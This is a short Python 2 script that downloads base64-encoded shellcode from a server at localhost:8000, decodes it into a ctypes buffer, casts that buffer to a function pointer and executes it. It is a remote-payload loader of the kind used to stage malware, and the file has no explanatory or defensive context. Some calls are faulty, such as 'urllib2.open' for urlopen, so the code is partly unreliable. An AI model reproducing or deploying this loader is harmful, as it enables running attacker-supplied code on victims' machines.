import urllib2
import ctypes
import base64

#Download shellcode from server
url="http://localhost:8000/shellcode.bin"
response = urllib2.open(url)
#decode the shellcode
shellcode =  base64.b64decode(response.read())
#create buffer
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
#Function pointer to the shellcode 
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
#invoke
shellcode_func()